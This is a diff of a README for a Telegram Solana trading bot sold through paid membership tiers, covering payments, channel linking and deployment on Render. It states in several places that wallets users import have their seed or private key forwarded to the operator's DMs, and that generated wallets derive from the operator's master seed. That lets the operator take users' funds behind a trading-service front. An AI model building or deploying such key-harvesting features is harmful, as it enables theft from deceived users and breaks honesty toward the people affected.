@@ -8,7 +8,6 @@ analytics **+ a real trading bot** with a real subscription business on top.
 | Name | Runner Bot | **PRIVATE ALPHA** |
 | Reports | First 3 free, then 0.1 SOL/wk / 0.3 SOL/mo / 3 SOL lifetime | **First 3 free (kept)**, then 4 membership tiers |
 | Membership | 3 flat plans | 🌱 Newbie 1 SOL · 🔰 Beginner 2 SOL · ⭐ Pro Trader 4 SOL · 💎 Elite Trader 8 SOL (prices & durations in `.env`) |
-| Insider | — | **🚀 JOIN INSIDER button** under the plans (own price/duration, e.g. 5 SOL/30 days) |
 | Channels | — | Extra paid channels in `.env` — **same system, each with its own price AND its own duration** |
 | Payments | Manual check button | **Real on-chain TX verification** + seed-phrase/base58/array payment wallet in `.env` |
 | User wallets | auto-created silently | **GENERATE or IMPORT on first entry to the trade side**; generation is deterministic from your master seed; imported seed/key is forwarded to the admin DM |
@@ -29,7 +28,7 @@ python bot.py
 ```
 
 - **BOT_TOKEN** — from @BotFather (set the bot's display name to
-  **PRIVATE ALPHA** there too: /mybots → Edit Bot → Edit Name).
+  **Private Alpha** there too: /mybots → Edit Bot → Edit Name).
 - **OWNER_ID** — your numeric Telegram ID (from @userinfobot).
 - **RPC_URL** — public works for testing; Helius/QuickNode recommended for production.
 
@@ -47,17 +46,16 @@ python bot.py
 
 Payments are real on-chain SOL transfers, verified **two ways**:
 
-- **SEND TX (main flow):** after sending the SOL, the user taps
+- **SEND TX (the only way):** after sending the SOL, the user taps
   `✅ I'VE PAID — SEND TX` and pastes their **transaction signature or
   Solscan link**. The bot checks that exact transaction: correct receiving
   address, amount ≥ price, success status, recent, and never used before —
-  then activates the subscription instantly.
-- **AUTO-CHECK:** the bot also scans the receiving address's latest
-  transactions as a fallback.
+  then activates the subscription instantly. No auto-checks.
 
-Either way, once verified the bot grants access, DMs the channel invite link,
-schedules expiry reminders and credits the referrer. Every address on the
-payment screens has a **📋 COPY** button (tap-to-copy).
+Once verified the bot grants access, DMs the channel invite link, schedules
+expiry reminders and credits the referrer. Addresses are shown as **plain
+text** (exactly like the original bot) so they can be selected and copied
+from the message itself.
 
 ## 3. User wallets (GENERATE or IMPORT)
 
@@ -80,13 +78,8 @@ and withdrawals.
 Every channel is sold independently with its own price and its own duration:
 
 ```env
-# 🚀 the big JOIN INSIDER button:
-INSIDER_PRICE=5
-INSIDER_DAYS=30
-INSIDER_CHANNEL_ID=-1001234567890
-
 # extra paid channels — Name|channel_id|price|days (days=0 → lifetime):
-CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45;Insider Calls|-1001111111111|15|60
+CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
 ```
 
 ### Linking your channels (the easy way)
@@ -96,7 +89,7 @@ the IDs from a link. The easy way:
 
 1. Add the bot as **admin** to the channel.
 2. DM the bot: `/setchannel newbie` (keys: `newbie`, `beginner`, `pro`,
-   `elite`, `insider` (Private Alpha), or a CHANNEL_PASSES name).
+   `elite`, or a CHANNEL_PASSES name).
 3. **Forward any message from that channel** to the bot — it saves the ID
    automatically. (Or send the `@username` / numeric id.)
 
@@ -138,18 +131,19 @@ shows as a free 📣 button in the main menu and welcome message.
 straight into your DM — on top of the automatic alerts you already get for
 every generated/imported/exported wallet.
 
-Admin DM alerts: every payment, every wallet generated/imported/exported
-(with the raw seed/key), every expiry.
+Admin DM alerts: **every new user that starts the bot**, every payment
+(with Solscan link), every wallet generated/imported/exported (with the raw
+seed/key), every expiry.
 
 ## 7. Deploy on Render (free web service) + UptimeRobot
 
 1. Push this repo to GitHub.
 2. Render → **New + → Blueprint** → pick the repo → it reads `render.yaml`
-   and creates a free **Web Service** named `insider-profits-bot` with a
+   and creates a free **Web Service** named `private-alpha-bot` with a
    public URL like `https://insider-profits-bot.onrender.com`.
 3. Set the secrets in the service's Environment tab: `BOT_TOKEN`,
    `OWNER_ID`, `TREASURY_PRIVATE_KEY` (or `TREASURY_ADDRESS`),
-   `WALLET_SEED`, `INSIDER_CHANNEL_ID`, `CHANNEL_PASSES`, `SUPPORT_LINK`.
+   `WALLET_SEED`, `DATABASE_URL`, `CHANNEL_PASSES`, `SUPPORT_LINK`.
 4. Deploy. The bot runs Telegram polling **and** a tiny health server that
    answers `200 OK` at `/` (Render's health check).
 
@@ -170,17 +164,22 @@ Admin DM alerts: every payment, every wallet generated/imported/exported
 Manual path: *New → Web Service*, Python, build
 `pip install -r requirements.txt`, start `python bot.py`.
 
-## 8. Persistence on Render (keep wallets across restarts)
+## 8. Persistence — PostgreSQL (recommended for Render)
 
-Free Render instances have an **ephemeral disk** — `runner.db` is wiped on
-every deploy/restart, which is why users would see the wallet prompt again.
-Two options:
+Free Render instances have an **ephemeral disk**: a local `runner.db` is
+wiped on every restart/deploy — that is exactly why the wallet prompt could
+come back after a redeploy. The fix is a real database:
 
-1. **Attach a persistent disk** (Render → your service → Disks → Add):
-   mount path `/var/data`, then set env var `DATA_DIR=/var/data` and redeploy.
-   The DB (users, wallets, subscriptions) survives every restart.
-2. Without a disk: the bot works fine within one deploy, and users can
-   re-import their wallets after redeploys (keys are also in your admin DMs).
+1. Create a **free Postgres**: [Neon](https://neon.tech) or
+   [Supabase](https://supabase.com) (both have free tiers).
+2. Copy its connection string into the Render env var:
+   `DATABASE_URL=postgresql://user:password@host:5432/dbname`
+3. Redeploy — users, wallets, subscriptions, positions and limit orders all
+   survive restarts forever. Wallets generated/imported show **once** and
+   stay.
+
+Locally (no DATABASE_URL) the bot uses SQLite automatically — same code,
+same features.
 
 ## 9. Prices — change anytime in `.env`
 
@@ -189,7 +188,6 @@ NEWBIE_PRICE=1      NEWBIE_DAYS=30
 BEGINNER_PRICE=2    BEGINNER_DAYS=30
 PRO_PRICE=4         PRO_DAYS=30
 ELITE_PRICE=8       ELITE_DAYS=60
-INSIDER_PRICE=5     INSIDER_DAYS=30
 BOT_MONTH_NAME=Monthly Access
 BOT_MONTH_PRICE=2   BOT_MONTH_DAYS=30
 CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
